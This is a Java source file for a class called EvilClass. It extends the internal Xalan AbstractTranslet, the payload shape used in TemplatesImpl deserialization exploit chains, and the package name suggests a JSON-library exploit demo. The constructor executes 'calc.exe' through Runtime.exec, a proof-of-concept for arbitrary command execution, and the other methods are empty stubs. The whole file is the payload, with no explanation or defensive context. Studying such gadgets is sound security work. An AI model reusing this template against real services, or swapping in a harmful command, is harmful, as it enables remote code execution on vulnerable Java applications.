package com.testjson.demo.Tem;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class EvilClass extends AbstractTranslet {
    public EvilClass() throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException{

    }
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException{

    }

    public static void main(String[] args) throws Exception{
        EvilClass evilClass = new EvilClass();
    }

}
